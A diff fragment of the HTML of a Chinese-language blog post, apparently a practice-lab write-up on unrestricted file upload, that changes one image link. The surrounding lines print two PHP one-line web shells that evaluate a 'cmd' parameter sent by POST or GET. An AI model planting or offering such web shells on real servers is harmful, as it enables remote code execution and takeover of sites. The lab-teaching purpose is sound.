@@ -153,7 +153,7 @@
 <p>从php代码中可以看到没有对上传文件做任何的过滤，当然现实中这种是极少的，只有在靶机中才会出现。</p>
 <p>我这里上传了两个php文件，都是一句话木马，只是数据上传方式不同而已，一个是post，一个是get</p>
 <p><img src="https://s2.ax1x.com/2020/02/23/33FKKA.png" alt="33FKKA.png"></p>
-<p><img src="C:%5CUsers%5Clenovo111%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200223214732642.png" alt="image-20200223214732642"></p>
+<p><img src="https://s2.ax1x.com/2020/03/03/3fGQKK.png" alt="3fGQKK.png"></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
